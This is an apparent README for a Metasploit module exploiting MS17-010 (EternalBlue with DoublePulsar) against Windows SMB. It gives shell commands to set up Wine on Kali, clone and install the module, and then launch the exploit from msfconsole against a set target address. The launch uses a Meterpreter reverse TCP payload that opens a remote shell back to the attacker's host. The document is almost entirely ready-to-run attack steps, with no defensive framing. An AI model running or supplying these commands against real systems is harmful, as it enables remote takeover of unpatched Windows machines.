# ms17_010_eternalblue_doublepulsar

### For Kali x64

```sh
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
rm -r ~/.wine && wine cmd.exe
exit
```

### For Kali x86

```sh
rm -r ~/.wine && wine cmd.exe
exit
```

### Download & Install

```sh
cd tmp && git clone https://github.com/hhktony/ms17_010_eternalblue_doublepulsar.git
cp ms17_010_eternalblue_doublepulsar/ms17_010_eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
mkdir -p /usr/share/metasploit-framework/modules/exploits/smb
cp -r ms17_010_eternalblue_doublepulsar/deps /usr/share/metasploit-framework/modules/exploits/smb
rm -rf ms17_010_eternalblue_doublepulsar
```

### Exploit

```sh
msfconsole

reload_all
use exploit/windows/smb/ms17_010_eternalblue_doublepulsar
# show options
set RHOST 10.0.0.100
set TARGETARCHITECTURE x64
# show targets
# set TARGET 9
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.11
exploit
```
## Credit to hkktony (~_^)
